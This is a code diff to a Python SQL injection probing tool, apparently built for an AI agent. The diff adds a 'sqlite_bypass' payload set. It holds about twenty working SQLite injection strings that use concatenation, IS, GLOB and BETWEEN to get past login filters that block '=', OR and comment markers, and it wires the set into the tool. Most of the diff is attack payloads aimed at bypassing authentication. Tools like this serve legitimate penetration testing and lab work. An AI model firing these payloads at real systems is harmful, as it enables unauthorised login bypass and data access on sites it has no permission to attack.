@@ -46,10 +46,11 @@ class SqliProbeTool:
         "Test SQL injection vulnerabilities by sending various payloads to a target parameter. "
         "Input must be JSON with keys: 'url' (target URL), 'method' ('GET' or 'POST'), "
         "'param' (parameter name to inject into), 'payload_set' (one of 'auth_bypass', "
-        "'error_based', 'union_detect', or 'custom'), optional 'custom_payloads' (list of "
-        "payloads if using custom set), optional 'data' (other form data to include), "
-        "optional 'headers', optional 'timeout' (default 10). Returns analysis of which "
-        "payloads triggered SQL errors, authentication bypasses, or other interesting responses."
+        "'error_based', 'union_detect', 'sqlite_bypass', or 'custom'), optional "
+        "'custom_payloads' (list of payloads if using custom set), optional 'data' "
+        "(other form data to include), optional 'headers', optional 'timeout' (default 10). "
+        "Returns analysis of which payloads triggered SQL errors, authentication bypasses, "
+        "or other interesting responses."
     )
 
     # Authentication bypass payloads - designed to return true or bypass login
@@ -148,6 +149,37 @@ class SqliProbeTool:
         "\") UNION SELECT NULL, NULL --",
     ]
 
+    # SQLite filter bypass payloads - designed for filtered environments
+    SQLITE_BYPASS_PAYLOADS: List[str] = [
+        # Concatenation-based admin bypass
+        "ad'||'min",
+        "ad'||'min'||'",
+        "ad'||'min' || '",
+        "a'||'dmin",
+        "adm'||'in",
+        # IS operator (equality without =)
+        "' IS NOT NULL --",
+        "admin' AND 1 IS 1 --",
+        "' IS NOT NULL OR '1' IS '1",
+        # GLOB operator (matching without = or LIKE)
+        "' GLOB '*' --",
+        "admin' AND username GLOB 'admin",
+        "' OR username GLOB '*' --",
+        # BETWEEN operator (equality via range)
+        "' OR username BETWEEN 'admin' AND 'admin' --",
+        "' OR id BETWEEN 1 AND 1 --",
+        # No-comment payloads (when -- and /* are blocked)
+        "ad'||'min'||'",
+        "' || '1' || '",
+        "admin' || '",
+        # Double-pipe boolean (when OR is blocked)
+        "' || 1 || '",
+        "' || '1",
+        # Mixed bypass (multiple filters)
+        "ad'||'min' AND 1 IS 1 || '",
+        "' IS NOT NULL || '",
+    ]
+
     # SQL error patterns to detect
     SQL_ERROR_PATTERNS: List[Tuple[str, str]] = [
         (r"SQL syntax.*MySQL", "MySQL syntax error"),
@@ -234,6 +266,8 @@ class SqliProbeTool:
             return self.ERROR_BASED_PAYLOADS
         elif payload_set == "union_detect":
             return self.UNION_DETECT_PAYLOADS
+        elif payload_set == "sqlite_bypass":
+            return self.SQLITE_BYPASS_PAYLOADS
         elif payload_set == "custom":
             return custom_payloads or []
         else:
@@ -307,8 +341,8 @@ class SqliProbeTool:
             return "[SqliProbeTool] Error: 'param' (string) is required - the parameter to inject into."
 
         payload_set = data.get("payload_set", "auth_bypass")
-        if payload_set not in ("auth_bypass", "error_based", "union_detect", "custom"):
-            return "[SqliProbeTool] Error: 'payload_set' must be one of: auth_bypass, error_based, union_detect, custom."
+        if payload_set not in ("auth_bypass", "error_based", "union_detect", "sqlite_bypass", "custom"):
+            return "[SqliProbeTool] Error: 'payload_set' must be one of: auth_bypass, error_based, union_detect, sqlite_bypass, custom."
 
         custom_payloads = data.get("custom_payloads")
         if payload_set == "custom" and not custom_payloads:
